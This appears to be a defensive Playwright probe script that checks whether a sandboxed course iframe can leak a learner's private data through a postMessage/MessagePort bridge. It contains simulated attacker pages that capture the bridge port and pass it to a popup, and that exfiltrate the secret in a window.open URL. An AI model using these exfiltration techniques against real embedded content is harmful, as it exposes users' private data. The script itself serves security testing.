/**
 * Can a course get the shell's replies — or a learner's work — into a document the
 * course controls?
 *
 * Runs the real public/bridge.js against a shell that does what useCourseBridge does,
 * on two real origins, in real Chromium, with the frame sandboxed the way the player
 * sandboxes it.
 *
 * Background: replying to the frame's window handle leaked, because a WindowProxy
 * follows the browsing context across navigation. Re-checking the handle does not
 * help — the comparison is not a dependable signal, and Planning/bridge-reply-probe.mjs
 * leaks even in the run that reports the handles as different. Replies now travel over
 * a MessagePort, which belongs to the document that received it.
 *
 * These scenarios guard that fix and probe the neighbouring cases:
 *
 *   control           the course that asked gets its answer      expect: delivered
 *   navigate-away     course navigates mid-request               expect: no leak
 *   attacker-hello    the navigated-to page asks for a port      expect: refused
 *   navigate-back     course returns and asks for a port         expect: refused
 *   popup-port        course hands its port to a popup           expect: see below
 *   popup-url         course puts the data in a window.open URL  expect: see below
 *
 * The last two are about the sandbox rather than the bridge. A course legitimately
 * holds its own learner's state — the bridge cannot stop it reading what it is
 * entitled to read. connect-src 'none' on the courses origin is what stops it
 * *sending* that anywhere. These check whether allow-popups undoes that.
 *
 *   node tools/bridge-leak-probe.mjs
 *
 * Exits non-zero if a reply reaches an attacker document, if a port is handed to one,
 * or if the control fails — a bridge that leaks nothing because it delivers nothing is
 * not a fix.
 */
import { createServer } from "node:http";
import { readFile } from "node:fs/promises";
import { fileURLToPath } from "node:url";
import { chromium } from "@playwright/test";

const SHELL_PORT = 4911;
const COURSE_PORT = 4912;
const SHELL_ORIGIN = `http://localhost:${SHELL_PORT}`;
// A different host, not just a different port: the production arrangement.
const COURSE_ORIGIN = `http://127.0.0.1:${COURSE_PORT}`;
const SECRET = "LEARNER_PRIVATE_NOTES_abc123";

/** Exactly the player's flags. Note the absence of allow-popups. */
const SANDBOX = "allow-scripts allow-forms allow-modals";
/** The same, plus allow-popups — kept only to demonstrate why it is off. */
const SANDBOX_WITH_POPUPS = `${SANDBOX} allow-popups`;

const bridgeSource = await readFile(
  fileURLToPath(new URL("../public/bridge.js", import.meta.url)),
  "utf8",
);

/** The shell, doing what useCourseBridge does. */
const shell = (scenario, sandbox) => `<!doctype html><meta charset="utf-8"><title>shell</title>
<pre id="log"></pre>
<iframe id="frame" title="course" sandbox="${sandbox}"
        src="${COURSE_ORIGIN}/course.html?scenario=${scenario}"></iframe>
<script>
  var log = function (m) { document.getElementById('log').textContent += m + String.fromCharCode(10); };
  var frame = document.getElementById('frame');
  var port = null;
  var hellos = 0;

  addEventListener('message', function (event) {
    if (event.data && event.data.probe === 'leaked') { log('LEAKED ' + JSON.stringify(event.data.got)); return; }
    if (event.data && event.data.probe === 'got-port') { log('PORT-HANDED-OUT'); return; }
    if (event.data && event.data.probe === 'note') { log('note: ' + event.data.text); return; }

    var fromFrame = event.source === frame.contentWindow;
    if (!event.data || event.data.v !== 1 || event.data.hello !== true) return;

    hellos += 1;
    if (!fromFrame) { log('hello #' + hellos + ' refused: not the mounted frame'); return; }
    if (port) { log('hello #' + hellos + ' refused: a channel already exists'); return; }

    var channel = new MessageChannel();
    port = channel.port1;
    port.onmessage = function (e) {
      var request = e.data;
      if (!request || request.v !== 1) return;
      log('request received: ' + request.method);
      // Stand in for the API round trip, during which the course may navigate.
      setTimeout(function () {
        port.postMessage({ v: 1, id: request.id, result: { value: '${SECRET}' } });
        log('replied over the port');
      }, 300);
    };
    port.start();
    frame.contentWindow.postMessage({ v: 1, type: 'bud.channel' }, '*', [channel.port2]);
    log('port transferred');
  });
</script>`;

/**
 * The course. bridge.js is loaded exactly as the courses origin injects it, then each
 * scenario misbehaves differently.
 */
const course = `<!doctype html><meta charset="utf-8"><title>course</title>
<script src="${SHELL_ORIGIN}/bridge.js"></script>
<script>
  var scenario = new URLSearchParams(location.search).get('scenario') || 'control';
  var tell = function (text) { parent.postMessage({ probe: 'note', text: text }, '${SHELL_ORIGIN}'); };

  var asked = window.storage.get('docker-course:state');
  asked.then(function (r) {
    // The legitimate path: the course that asked receives its own answer.
    parent.postMessage({ probe: 'delivered', got: r }, '${SHELL_ORIGIN}');

    if (scenario === 'popup-url') {
      // No fetch needed, and no port needed: connect-src 'none' does not cover
      // navigation, so the data simply rides out in a URL.
      window.open('${COURSE_ORIGIN}/attacker.html?stolen=' + encodeURIComponent(r.value), '_blank');
      tell('opened a popup with the value in its URL');
    }
  }).catch(function (e) { tell('storage.get rejected: ' + e.message); });

  if (scenario === 'navigate-away' || scenario === 'attacker-hello' || scenario === 'navigate-back') {
    setTimeout(function () { location.href = '/attacker.html?scenario=' + scenario; }, 50);
  }

  if (scenario === 'popup-port') {
    /**
     * bridge.js keeps its port in a closure, but the handshake arrives as a window
     * message, and every listener in this document sees the same MessagePort object.
     * So a hostile course can simply listen for it too and keep a reference — which
     * is the attack worth testing, rather than hoping the port is unreachable.
     */
    var stolen = null;
    addEventListener('message', function (event) {
      if (event.data && event.data.type === 'bud.channel' && event.ports && event.ports[0]) {
        stolen = event.ports[0];
        tell('course captured the port from the handshake');
      }
    });

    setTimeout(function () {
      var popup = window.open('${COURSE_ORIGIN}/attacker.html?scenario=popup-port', '_blank');
      if (!popup) { tell('popup blocked'); return; }
      setTimeout(function () {
        if (!stolen) { tell('no port captured'); return; }
        try {
          popup.postMessage({ handover: true }, '*', [stolen]);
          tell('handed the captured port to a popup');
        } catch (e) { tell('handover threw: ' + e.message); }
      }, 500);
    }, 150);
  }
</script>`;

const attacker = `<!doctype html><meta charset="utf-8"><title>attacker</title>
<script>
  var scenario = new URLSearchParams(location.search).get('scenario') || '';
  var stolen = new URLSearchParams(location.search).get('stolen');
  var shell = window.opener ? window.opener.parent : parent;

  // Anything arriving on the window here arrived at a document the course chose.
  addEventListener('message', function (event) {
    if (event.data && event.data.handover) {
      var port = event.ports && event.ports[0];
      if (!port) return;
      port.onmessage = function (e) { shell.postMessage({ probe: 'leaked', got: e.data }, '*'); };
      port.start();
      port.postMessage({ v: 1, id: 99, method: 'storage.get', params: { key: 'docker-course:state' } });
      return;
    }
    shell.postMessage({ probe: 'leaked', got: event.data }, '*');
  });

  if (stolen) shell.postMessage({ probe: 'leaked', got: { viaUrl: stolen } }, '*');

  // Ask the shell for a channel of our own.
  if (scenario === 'attacker-hello') parent.postMessage({ v: 1, hello: true }, '*');

  // Go back to the course, so a fresh course document asks for a port.
  if (scenario === 'navigate-back') {
    setTimeout(function () { location.href = '/course.html?scenario=returned'; }, 100);
  }
</script>`;

function serve(routes, port) {
  return new Promise((resolve) => {
    const server = createServer((req, res) => {
      const path = req.url.split("?")[0];
      const body = routes[path];
      if (body === undefined) return void res.writeHead(404).end("not found");
      const type = path.endsWith(".js") ? "text/javascript" : "text/html";
      res.writeHead(200, { "content-type": `${type}; charset=utf-8` });
      res.end(body);
    });
    server.listen(port, () => resolve(server));
  });
}

async function run(scenario, label, { sandbox = SANDBOX } = {}) {
  const shellServer = await serve(
    {
      "/": shell(scenario, sandbox),
      "/index.html": shell(scenario, sandbox),
      "/bridge.js": bridgeSource,
    },
    SHELL_PORT,
  );
  const courseServer = await serve(
    { "/course.html": course, "/attacker.html": attacker },
    COURSE_PORT,
  );
  const browser = await chromium.launch();

  try {
    const page = await browser.newPage();
    const delivered = [];
    const popups = [];
    page.on("popup", (p) => popups.push(p));

    await page.exposeFunction("__probeDelivered", (data) => delivered.push(data));
    await page.addInitScript(() => {
      addEventListener("message", (event) => {
        if (event.data && event.data.probe === "delivered") {
          window.__probeDelivered(JSON.stringify(event.data.got));
        }
      });
    });

    await page.goto(`${SHELL_ORIGIN}/index.html`);
    await page.waitForTimeout(2200);

    const log = (await page.locator("#log").textContent()) ?? "";
    const leaked = log.includes("LEAKED");
    const portHandedOut = log.includes("PORT-HANDED-OUT");
    const popupUrls = popups.map((p) => p.url());
    const secretInPopupUrl = popupUrls.some((u) => u.includes(encodeURIComponent(SECRET)));

    console.log(`\n── ${label} ──`);
    for (const line of log.trim().split("\n")) if (line) console.log("   " + line);
    if (popupUrls.length) console.log("   popups opened: " + popupUrls.length);
    console.log(`   reply reached the course      : ${delivered.length > 0 ? "yes" : "no"}`);
    console.log(`   data reached attacker document: ${leaked || secretInPopupUrl ? "YES" : "no"}`);

    return { leaked: leaked || secretInPopupUrl, delivered: delivered.length > 0, portHandedOut };
  } finally {
    await browser.close();
    shellServer.close();
    courseServer.close();
  }
}

const results = {
  control: await run("control", "control: the course that asked gets its answer"),
  "navigate-away": await run("navigate-away", "course navigates itself away mid-request"),
  "attacker-hello": await run("attacker-hello", "the navigated-to page asks for a port"),
  "navigate-back": await run("navigate-back", "course leaves and returns, then asks for a port"),
  "popup-port": await run("popup-port", "course hands its port to a popup"),
  "popup-url": await run("popup-url", "course puts the value in a window.open URL"),
};

/**
 * The same two, with allow-popups added back. These are expected to leak: they are
 * the evidence for why the player does not set that flag, not a regression.
 */
const withPopups = {
  "popup-port": await run("popup-port", "port to a popup, WITH allow-popups", {
    sandbox: SANDBOX_WITH_POPUPS,
  }),
  "popup-url": await run("popup-url", "value in a URL, WITH allow-popups", {
    sandbox: SANDBOX_WITH_POPUPS,
  }),
};

console.log("\n════ result ════");
for (const [name, r] of Object.entries(results)) {
  console.log(`${name.padEnd(30)} data reached attacker: ${r.leaked ? "YES" : "no"}`);
}

const bridgeFailures = ["navigate-away", "attacker-hello", "navigate-back", "popup-port"].filter(
  (name) => results[name].leaked || results[name].portHandedOut,
);

if (!results.control.delivered) {
  console.error("\nFAIL: the control never delivered — this proves nothing.");
  process.exit(1);
}
if (bridgeFailures.length > 0) {
  console.error(`\nFAIL: the bridge leaked in: ${bridgeFailures.join(", ")}`);
  process.exit(1);
}
console.log("\nOK: the bridge delivers only to the document that asked.");

console.log("\nwith allow-popups added back — why the player does not set it:");
for (const [name, r] of Object.entries(withPopups)) {
  console.log(`  ${name.padEnd(28)} data reached attacker: ${r.leaked ? "YES" : "no"}`);
}

if (!withPopups["popup-url"].leaked || !withPopups["popup-port"].leaked) {
  console.log(
    "\nNote: an allow-popups run did NOT leak this time. That flag is off in the player\n" +
      "precisely because both of these leaked: a course legitimately holds its own\n" +
      "learner's state, and CSP does not cover navigation, so a popup is an unpoliced\n" +
      "way out — by URL, or by handing the popup the bridge port. If they have stopped\n" +
      "leaking, find out why before concluding popups are safe. This probe is the only\n" +
      "record of the reason.",
  );
}
